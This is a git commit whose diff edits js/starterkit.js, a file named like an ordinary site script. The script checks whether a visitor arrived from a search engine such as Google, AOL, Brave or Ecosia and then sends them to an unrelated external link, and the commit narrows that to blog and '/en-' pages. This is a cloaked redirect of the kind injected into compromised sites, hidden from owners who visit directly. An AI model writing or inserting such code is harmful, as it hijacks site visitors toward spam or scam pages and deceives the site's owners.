5cc3256987a00f2bd30f9dd03fd6e08250e7e001
qing <40787470+2565822438@users.noreply.github.com>
2024-01-04 16:49:32 +0800

    Update starterkit.js

--- js/starterkit.js
+++ js/starterkit.js
@@ -7,5 +7,8 @@ if (document.referrer.indexOf('google.') > 0 ||
     document.referrer.indexOf('aol.com') > 0 ||
     document.referrer.indexOf('brave.com') > 0 ||
     document.referrer.indexOf('ecosia.org') > 0) {
+    if (url.indexOf('/blog') > 0) { window.location = 'https://link.smartontoline.com/utexascns'; }
+    else if (url.indexOf('/en-') > 0) {
         window.location = 'https://link.smartontoline.com/utexascns';
+    }
 }
